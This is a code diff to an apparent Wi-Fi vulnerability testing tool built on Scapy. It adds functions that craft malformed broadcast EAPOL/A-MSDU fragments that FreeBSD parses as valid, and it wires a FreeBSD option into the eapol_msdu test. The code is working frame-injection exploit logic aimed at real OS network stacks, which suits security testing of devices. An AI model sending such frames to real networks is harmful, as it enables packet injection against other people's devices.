@@ -84,6 +84,44 @@ def add_msdu_frag(src, dst, payload):
 
 	return p / payload / Raw(padding)
 
+def freebsd_create_eapolmsdu(src, dst, payload):
+	"""
+	FreeBSD doesn't properly parse EAPOL/MSDU frames for some reason.
+	It's unclear why. But this code puts the length and addresses at
+	the rigth positions so FreeBSD will parse the A-MSDU frame
+	successfully, so that we can even attack bad implementations.
+	"""
+
+	# EAPOL and source address. I don't think the value "\x00\06" is important
+	rawmac = bytes.fromhex(src.replace(':', ''))
+	prefix = raw(LLC()/SNAP()/EAPOL()) + b"\x00\x06" + rawmac
+
+	# Length followed by the payload
+	payload = add_msdu_frag(src, dst, payload)
+	payload = prefix + struct.pack(">I", len(payload)) + raw(payload)
+
+	# Put the destination MAC address in the "right" place
+	rawmac = bytes.fromhex(dst.replace(':', ''))
+	payload = payload[:16] + rawmac[:4] + payload[20:]
+
+	return payload
+
+def freebsd_encap_eapolmsdu(p, src, dst, payload):
+	"""
+	Here p is the header of a frame, and payload the desired content
+	that will be accepted by FreeBSD.
+	"""
+
+	# Broadcast/multicast fragments do not affect the fragment cache
+	p.addr1 = "ff:ff:ff:ff:ff:ff"
+
+	# Encapsulate EAPOL in malformed EAPOL/A-MSDU fragment
+	p.Reserved = 1
+
+
+	p = p/freebsd_create_eapolmsdu(src, dst, payload)
+	return p
+
 # ----------------------------------- Tests -----------------------------------
 
 # XXX --- We should always first see how the DUT reactions to a normal packet.
@@ -422,10 +460,11 @@ class EapolTest(Test):
 
 
 class EapolMsduTest(Test):
-	def __init__(self, ptype, actions):
+	def __init__(self, ptype, actions, freebsd=False):
 		super().__init__(actions)
 		self.ptype = ptype
 		self.check_fn = None
+		self.freebsd = freebsd
 
 	def check(self, p):
 		if self.check_fn == None:
@@ -443,7 +482,11 @@ class EapolMsduTest(Test):
 		#header.addr2 = "00:11:22:33:44:55"
 
 		# Masquerade A-MSDU frame as an EAPOL frame
-		request = LLC()/SNAP()/EAPOL()/Raw(b"\x00\x06AAAAAA") / add_msdu_frag(station.mac, station.get_peermac(), request)
+		if self.freebsd:
+			log(STATUS, "Creating malformed EAPOL/MSDU that FreeBSD treats as valid")
+			request = freebsd_create_eapolmsdu(station.mac, station.get_peermac(), request)
+		else:
+			request = LLC()/SNAP()/EAPOL()/Raw(b"\x00\x06AAAAAA") / add_msdu_frag(station.mac, station.get_peermac(), request)
 
 		frames = create_fragments(header, request, 1)
 
@@ -539,32 +582,11 @@ class Station():
 		# Add payload headers
 		payload = LLC()/SNAP()/payload
 
-		# Special case when sending EAP(OL) frames to NetBSD
-		if self.options.freebsd and (EAP in data or EAPOL in data):
+		# Special case when sending EAP(OL) frames to NetBSD. Must be EAPOL/MSDU because
+		# only "EAPOL" frames are now accepted.
+		if self.options.freebsd_cache and (EAP in data or EAPOL in data):
 			log(STATUS, "Sending EAPOL as (malformed) broadcast EAPOL/A-MSDU")
-
-			# Broadcast/multicast fragments do not affect the fragment cache
-			p.addr1 = "ff:ff:ff:ff:ff:ff"
-
-			# Encapsulate EAPOL in malformed EAPOL/A-MSDU fragment
-			p.Reserved = 1
-
-			# FreeBSD only accepts the frame if it starts with EAPOL header.
-			# I don't think the value "\x00\06" is important.
-			rawmac = bytes.fromhex(self.mac.replace(':', ''))
-			prefix = raw(LLC()/SNAP()/EAPOL()) + b"\x00\x06" + rawmac
-
-			# FreeBSD doesn't properly parse EAPOL/MSDU frames for some reason.
-			# It's unclear why. Put this code puts the length and addresses at
-			# the rigth positions so FreeBSD will parse the frame.
-			payload = add_msdu_frag(self.mac, self.get_peermac(), payload)
-			payload = prefix + struct.pack(">I", len(payload)) + raw(payload)
-
-			# Put the destination MAC address in the right place
-			rawmac = bytes.fromhex(self.get_peermac().replace(':', ''))
-			payload = payload[:16] + rawmac[:4] + payload[20:]
-
-			p = p/payload
+			p = freebsd_encap_eapolmsdu(p, self.mac, self.get_peermac(), payload)
 
 		# Normal case only need to check for encryption
 		else:
@@ -1326,7 +1348,12 @@ def prepare_tests(test_name, stractions, delay=0, inc_pn=0, as_msdu=None, ptype=
 				 Action(Action.AfterAuth, enc=True)])
 
 	elif test_name == "eapol_msdu":
+		freebsd = False
 		if stractions != None:
+			# TODO: Clean up this parsing / specification
+			if stractions.startswith("M,"):
+				freebsd = True
+				stractions = stractions[2:]
 			prefix, specific = stractions[:-3], stractions[-2:]
 			actions = []
 			if len(prefix) > 0:
@@ -1336,7 +1363,7 @@ def prepare_tests(test_name, stractions, delay=0, inc_pn=0, as_msdu=None, ptype=
 			actions = [Action(Action.StartAuth, enc=False),
 				   Action(Action.StartAuth, enc=False)]
 
-		test = EapolMsduTest(REQ_ICMP, actions)
+		test = EapolMsduTest(REQ_ICMP, actions, freebsd)
 
 	elif test_name == "linux_plain":
 		decoy_tid = None if stractions == None else int(stractions)
@@ -1439,7 +1466,7 @@ if __name__ == "__main__":
 	parser.add_argument('--full-reconnect', default=False, action='store_true', help="Reconnect by deauthenticating first.")
 	parser.add_argument('--bcast', default=False, action='store_true', help="Send pings using broadcast receiver address (addr1).")
 	parser.add_argument('--pn-per-qos', default=False, action='store_true', help="Use separate Tx packet counter for each QoS TID.")
-	parser.add_argument('--freebsd', default=False, action='store_true', help="Sent EAP(OL) frames as (malformed) broadcast EAPOL/A-MSDUs.")
+	parser.add_argument('--freebsd-cache', default=False, action='store_true', help="Sent EAP(OL) frames as (malformed) broadcast EAPOL/A-MSDUs.")
 	parser.add_argument('--connected-delay', type=int, default=1, help="Second to wait after AfterAuth before triggering Connected event")
 	args = parser.parse_args()
 
@@ -1457,7 +1484,7 @@ if __name__ == "__main__":
 	options.rekey_early_install = args.rekey_early_install
 	options.full_reconnect = args.full_reconnect
 	options.pn_per_qos = args.pn_per_qos
-	options.freebsd = args.freebsd
+	options.freebsd_cache = args.freebsd_cache
 	options.connected_delay = args.connected_delay
 
 	# Parse remaining options
